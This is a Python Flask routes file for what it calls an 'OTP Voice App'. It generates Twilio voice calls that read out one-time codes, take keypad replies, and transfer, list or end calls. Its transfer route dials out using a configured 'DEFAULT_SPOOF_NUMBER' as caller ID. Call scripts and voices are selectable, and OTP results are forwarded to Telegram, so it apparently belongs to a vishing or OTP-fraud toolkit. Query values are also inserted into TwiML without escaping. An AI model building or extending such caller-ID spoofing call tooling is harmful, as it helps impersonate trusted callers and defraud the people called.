"""
Voice Routes for OTP Voice App
Handles TwiML generation and voice call endpoints with advanced call control
"""

import logging
import os
from flask import Blueprint, request, Response, jsonify, send_file
from services.twilio_service import TwilioService
from services.elevenlabs_service import ElevenLabsService
from services.otp_service import OTPService
from config.settings import Config

logger = logging.getLogger(__name__)
voice_bp = Blueprint('voice', __name__)

# Initialize services
twilio_service = TwilioService()
elevenlabs_service = ElevenLabsService()
otp_service = OTPService()

# Store active calls for real-time control
active_calls = {}

@voice_bp.route('/twiml/<otp_code>', methods=['GET', 'POST'])
def generate_twiml(otp_code):
    """
    Generate interactive TwiML for voice call with OTP code
    Includes accept/deny options and DTMF input

    Args:
        otp_code: The OTP code to be spoken
    """
    try:
        # Get script name from query parameters
        script_name = request.args.get('script', 'default')
        voice = request.args.get('voice', 'Rachel')
        user_id = request.args.get('user_id', 'unknown')

        logger.info(f"Generating interactive TwiML for OTP: {otp_code}, Script: {script_name}, Voice: {voice}")

        # Generate speech text
        speech_text = elevenlabs_service.generate_otp_message(otp_code, script_name)

        # Create interactive TwiML with accept/deny options
        twiml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Polly.Joanna" rate="slow">{speech_text}</Say>
    <Pause length="1"/>
    <Gather input="dtmf" timeout="10" numDigits="1" action="{Config.NGROK_URL}/voice/handle_response/{otp_code}?user_id={user_id}&script={script_name}" method="POST">
        <Say voice="Polly.Joanna" rate="slow">Press 1 to accept this verification code, Press 2 to deny and request a new code, or Press 0 to repeat the message.</Say>
    </Gather>
    <Redirect>{Config.NGROK_URL}/voice/timeout/{otp_code}?user_id={user_id}</Redirect>
</Response>"""

        return Response(twiml_response, mimetype='application/xml')

    except Exception as e:
        logger.error(f"Error generating interactive TwiML: {e}")

        # Fallback TwiML without interaction
        fallback_twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Polly.Joanna">Your verification code is {' '.join(otp_code)}. Please enter this code to complete your verification.</Say>
    <Pause length="1"/>
    <Hangup/>
</Response>"""

        return Response(fallback_twiml, mimetype='application/xml')

@voice_bp.route('/handle_response/<otp_code>', methods=['POST'])
def handle_user_response(otp_code):
    """
    Handle user DTMF input during call (accept/deny/repeat)

    Args:
        otp_code: The OTP code being verified
    """
    try:
        digits = request.values.get('Digits', '')
        call_sid = request.values.get('CallSid')
        user_id = request.args.get('user_id', 'unknown')
        script_name = request.args.get('script', 'default')

        logger.info(f"User response for OTP {otp_code}: {digits}, Call: {call_sid}")

        # Store call interaction data
        call_data = {
            'otp_code': otp_code,
            'user_response': digits,
            'call_sid': call_sid,
            'user_id': user_id,
            'script_name': script_name,
            'timestamp': request.values.get('Timestamp')
        }

        active_calls[call_sid] = call_data

        if digits == '1':
            # User accepted the OTP
            twiml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Polly.Joanna">Thank you for confirming your verification code {' '.join(otp_code)}. Your verification is complete.</Say>
    <Pause length="1"/>
    <Hangup/>
</Response>"""

            # Log successful verification
            logger.info(f"OTP {otp_code} accepted by user {user_id}")

            # Send success notification to Telegram
            if otp_service.telegram_service:
                import asyncio
                success_result = {
                    'success': True,
                    'otp_code': otp_code,
                    'phone_number': 'via_call',
                    'script_name': script_name,
                    'user_id': user_id,
                    'user_action': 'accepted',
                    'call_sid': call_sid,
                    'timestamp': call_data['timestamp']
                }
                asyncio.run(otp_service.telegram_service.send_otp_result(success_result))

        elif digits == '2':
            # User denied the OTP - generate new one
            new_otp = otp_service.generate_otp_code()

            twiml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Polly.Joanna">Generating a new verification code for you.</Say>
    <Pause length="1"/>
    <Redirect>{Config.NGROK_URL}/voice/twiml/{new_otp}?script={script_name}&user_id={user_id}</Redirect>
</Response>"""

            logger.info(f"OTP {otp_code} denied by user {user_id}, generating new OTP: {new_otp}")

        elif digits == '0':
            # User wants to repeat the message
            twiml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Redirect>{Config.NGROK_URL}/voice/twiml/{otp_code}?script={script_name}&user_id={user_id}</Redirect>
</Response>"""

            logger.info(f"User {user_id} requested repeat for OTP {otp_code}")

        else:
            # Invalid input
            twiml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Polly.Joanna">Invalid option. Your verification code is {' '.join(otp_code)}.</Say>
    <Gather input="dtmf" timeout="10" numDigits="1" action="{Config.NGROK_URL}/voice/handle_response/{otp_code}?user_id={user_id}&script={script_name}" method="POST">
        <Say voice="Polly.Joanna">Press 1 to accept, Press 2 to deny, or Press 0 to repeat.</Say>
    </Gather>
    <Hangup/>
</Response>"""

        return Response(twiml_response, mimetype='application/xml')

    except Exception as e:
        logger.error(f"Error handling user response: {e}")

        # Fallback response
        twiml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Polly.Joanna">Thank you for calling. Your verification code is {' '.join(otp_code)}.</Say>
    <Hangup/>
</Response>"""

        return Response(twiml_response, mimetype='application/xml')

@voice_bp.route('/timeout/<otp_code>', methods=['GET', 'POST'])
def handle_timeout(otp_code):
    """
    Handle call timeout when user doesn't respond

    Args:
        otp_code: The OTP code that timed out
    """
    try:
        user_id = request.args.get('user_id', 'unknown')
        call_sid = request.values.get('CallSid')

        logger.info(f"Call timeout for OTP {otp_code}, User: {user_id}, Call: {call_sid}")

        twiml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Polly.Joanna">No response received. Your verification code is {' '.join(otp_code)}. Please use this code to complete your verification. Goodbye.</Say>
    <Hangup/>
</Response>"""

        # Log timeout event
        if call_sid in active_calls:
            active_calls[call_sid]['timeout'] = True

        return Response(twiml_response, mimetype='application/xml')

    except Exception as e:
        logger.error(f"Error handling timeout: {e}")
        return Response('<Response><Hangup/></Response>', mimetype='application/xml')

@voice_bp.route('/control/terminate/<call_sid>', methods=['POST'])
def terminate_call(call_sid):
    """
    Terminate an active call remotely

    Args:
        call_sid: Twilio call SID to terminate
    """
    try:
        result = twilio_service.client.calls(call_sid).update(status='completed')

        logger.info(f"Call {call_sid} terminated remotely")

        # Remove from active calls
        if call_sid in active_calls:
            del active_calls[call_sid]

        return jsonify({
            'success': True,
            'call_sid': call_sid,
            'status': 'terminated',
            'message': 'Call terminated successfully'
        })

    except Exception as e:
        logger.error(f"Error terminating call {call_sid}: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@voice_bp.route('/control/transfer/<call_sid>', methods=['POST'])
def transfer_call(call_sid):
    """
    Transfer an active call to another number or agent

    Args:
        call_sid: Twilio call SID to transfer
    """
    try:
        data = request.get_json()
        transfer_to = data.get('transfer_to')

        if not transfer_to:
            return jsonify({
                'success': False,
                'error': 'transfer_to number required'
            }), 400

        # Create TwiML for call transfer
        twiml_url = f"{Config.NGROK_URL}/voice/transfer_twiml?to={transfer_to}"

        result = twilio_service.client.calls(call_sid).update(url=twiml_url)

        logger.info(f"Call {call_sid} transferred to {transfer_to}")

        return jsonify({
            'success': True,
            'call_sid': call_sid,
            'transferred_to': transfer_to,
            'status': 'transferred'
        })

    except Exception as e:
        logger.error(f"Error transferring call {call_sid}: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@voice_bp.route('/transfer_twiml', methods=['GET', 'POST'])
def transfer_twiml():
    """
    Generate TwiML for call transfer
    """
    transfer_to = request.args.get('to')

    twiml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Polly.Joanna">Transferring your call to an agent. Please hold.</Say>
    <Dial timeout="30" callerId="{Config.DEFAULT_SPOOF_NUMBER}">
        <Number>{transfer_to}</Number>
    </Dial>
    <Say voice="Polly.Joanna">The agent is not available. Please try again later.</Say>
    <Hangup/>
</Response>"""

    return Response(twiml_response, mimetype='application/xml')

@voice_bp.route('/control/active_calls', methods=['GET'])
def get_active_calls():
    """
    Get list of currently active calls with control options
    """
    try:
        # Get live call status from Twilio for active calls
        live_calls = []

        for call_sid, call_data in active_calls.items():
            try:
                twilio_call = twilio_service.client.calls(call_sid).fetch()
                live_calls.append({
                    'call_sid': call_sid,
                    'status': twilio_call.status,
                    'duration': twilio_call.duration,
                    'otp_code': call_data.get('otp_code'),
                    'user_id': call_data.get('user_id'),
                    'user_response': call_data.get('user_response'),
                    'script_name': call_data.get('script_name'),
                    'start_time': str(twilio_call.start_time) if twilio_call.start_time else None,
                    'from': twilio_call.from_,
                    'to': twilio_call.to
                })
            except Exception as e:
                logger.warning(f"Could not fetch call {call_sid}: {e}")

        return jsonify({
            'success': True,
            'active_calls': live_calls,
            'total_calls': len(live_calls)
        })

    except Exception as e:
        logger.error(f"Error getting active calls: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@voice_bp.route('/control/call_history', methods=['GET'])
def get_call_history():
    """
    Get call history with user interactions
    """
    try:
        # Get recent calls from Twilio
        calls = twilio_service.client.calls.list(limit=50)

        call_history = []
        for call in calls:
            call_data = active_calls.get(call.sid, {})
            call_history.append({
                'call_sid': call.sid,
                'status': call.status,
                'duration': call.duration,
                'start_time': str(call.start_time) if call.start_time else None,
                'end_time': str(call.end_time) if call.end_time else None,
                'from': call.from_,
                'to': call.to,
                'otp_code': call_data.get('otp_code'),
                'user_response': call_data.get('user_response'),
                'user_id': call_data.get('user_id'),
                'script_name': call_data.get('script_name')
            })

        return jsonify({
            'success': True,
            'call_history': call_history,
            'total_calls': len(call_history)
        })

    except Exception as e:
        logger.error(f"Error getting call history: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@voice_bp.route('/twiml/say/<otp_code>', methods=['GET', 'POST'])
def generate_say_twiml(otp_code):
    """
    Generate simple TwiML using Say verb (fallback)

    Args:
        otp_code: The OTP code to be spoken
    """
    try:
        script_name = request.args.get('script', 'default')

        # Generate speech text
        speech_text = elevenlabs_service.generate_otp_message(otp_code, script_name)

        # Create TwiML with Say verb
        twiml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="Polly.Joanna" rate="slow">{speech_text}</Say>
    <Pause length="2"/>
    <Say voice="Polly.Joanna" rate="slow">I repeat, your code is {' '.join(otp_code)}.</Say>
    <Pause length="1"/>
    <Hangup/>
</Response>"""

        logger.info(f"Generated Say TwiML for OTP: {otp_code}")

        return Response(twiml_response, mimetype='application/xml')

    except Exception as e:
        logger.error(f"Error generating Say TwiML: {e}")

        # Basic fallback
        fallback_twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say>Your code is {' '.join(otp_code)}</Say>
    <Hangup/>
</Response>"""

        return Response(fallback_twiml, mimetype='application/xml')

@voice_bp.route('/audio/<filename>', methods=['GET'])
def serve_audio(filename):
    """
    Serve audio files for TwiML playback

    Args:
        filename: Name of the audio file
    """
    try:
        # In a real implementation, you'd serve from a CDN or static storage
        # For now, we'll return a placeholder response

        # Try to find the file in temporary directory
        temp_file_path = f"/tmp/{filename}"

        if os.path.exists(temp_file_path):
            return send_file(
                temp_file_path,
                mimetype='audio/mpeg',
                as_attachment=False
            )
        else:
            logger.warning(f"Audio file not found: {filename}")
            return jsonify({
                'error': 'Audio file not found'
            }), 404

    except Exception as e:
        logger.error(f"Error serving audio file {filename}: {e}")
        return jsonify({
            'error': 'Internal server error'
        }), 500

@voice_bp.route('/webhook/status', methods=['POST'])
def voice_status_webhook():
    """
    Handle Twilio voice status webhooks
    """
    try:
        # Get call status data from Twilio
        call_sid = request.values.get('CallSid')
        call_status = request.values.get('CallStatus')
        call_duration = request.values.get('CallDuration')
        from_number = request.values.get('From')
        to_number = request.values.get('To')

        logger.info(f"Voice status webhook: {call_sid} - {call_status}")

        # Log the call status
        status_data = {
            'call_sid': call_sid,
            'status': call_status,
            'duration': call_duration,
            'from': from_number,
            'to': to_number,
            'timestamp': request.values.get('Timestamp')
        }

        # Here you could update a database or send notifications
        logger.info(f"Call completed: {status_data}")

        return Response('OK', mimetype='text/plain')

    except Exception as e:
        logger.error(f"Error processing voice status webhook: {e}")
        return Response('Error', mimetype='text/plain'), 500

@voice_bp.route('/generate_audio', methods=['POST'])
def generate_audio():
    """
    Generate audio file for OTP message

    JSON Payload:
    {
        "text": "Your verification code is 123456",
        "voice": "Rachel",
        "script_name": "default"
    }
    """
    try:
        data = request.get_json()

        if not data:
            return jsonify({
                'success': False,
                'error': 'No JSON data provided'
            }), 400

        text = data.get('text')
        voice = data.get('voice', 'Rachel')
        script_name = data.get('script_name', 'default')
        otp_code = data.get('otp_code')

        if not text and not otp_code:
            return jsonify({
                'success': False,
                'error': 'Either text or otp_code is required'
            }), 400

        # Generate text if OTP code is provided
        if otp_code and not text:
            text = elevenlabs_service.generate_otp_message(otp_code, script_name)

        # Generate audio
        result = elevenlabs_service.text_to_speech(
            text=text,
            voice_name=voice
        )

        if result['success']:
            # Return audio file info
            return jsonify({
                'success': True,
                'audio_url': f"{Config.NGROK_URL}/voice/audio/{os.path.basename(result['file_path'])}",
                'file_path': result['file_path'],
                'voice': result['voice'],
                'text_length': result['text_length']
            })
        else:
            return jsonify({
                'success': False,
                'error': result['error']
            }), 500

    except Exception as e:
        logger.error(f"Error generating audio: {e}")
        return jsonify({
            'success': False,
            'error': 'Internal server error'
        }), 500

@voice_bp.route('/test_call', methods=['POST'])
def test_call():
    """
    Test voice call functionality

    JSON Payload:
    {
        "to_number": "+1234567890",
        "message": "This is a test call",
        "voice": "Rachel"
    }
    """
    try:
        data = request.get_json()

        if not data:
            return jsonify({
                'success': False,
                'error': 'No JSON data provided'
            }), 400

        to_number = data.get('to_number')
        message = data.get('message', 'This is a test call from OTP Voice App')
        voice = data.get('voice', 'Rachel')

        if not to_number:
            return jsonify({
                'success': False,
                'error': 'to_number is required'
            }), 400

        # Generate test audio
        tts_result = elevenlabs_service.text_to_speech(
            text=message,
            voice_name=voice
        )

        if not tts_result['success']:
            return jsonify({
                'success': False,
                'error': f"TTS generation failed: {tts_result['error']}"
            }), 500

        # Create TwiML URL for test
        twiml_url = f"{Config.NGROK_URL}/voice/twiml/test?script=default&voice={voice}"

        # Make test call
        call_result = twilio_service.make_voice_call(
            to_number=to_number,
            twiml_url=twiml_url
        )

        # Clean up temp file
        elevenlabs_service.cleanup_temp_file(tts_result['file_path'])

        return jsonify(call_result)

    except Exception as e:
        logger.error(f"Error making test call: {e}")
        return jsonify({
            'success': False,
            'error': 'Internal server error'
        }), 500

@voice_bp.route('/available_voices', methods=['GET'])
def get_available_voices():
    """
    Get list of available voices
    """
    try:
        voices = elevenlabs_service.get_available_voices()

        return jsonify({
            'success': True,
            'voices': voices,
            'default_voice': Config.ELEVENLABS_DEFAULT_VOICE
        })

    except Exception as e:
        logger.error(f"Error getting available voices: {e}")
        return jsonify({
            'success': False,
            'error': 'Internal server error'
        }), 500

@voice_bp.route('/status', methods=['GET'])
def voice_status():
    """
    Get voice service status
    """
    return jsonify({
        'success': True,
        'status': 'healthy',
        'twilio_configured': twilio_service.client is not None,
        'elevenlabs_configured': elevenlabs_service.api_key is not None,
        'ngrok_url': Config.NGROK_URL,
        'service': 'Voice Integration'
    })

@voice_bp.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return jsonify({
        'success': False,
        'error': 'Voice endpoint not found'
    }), 404

@voice_bp.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    return jsonify({
        'success': False,
        'error': 'Internal server error'
    }), 500
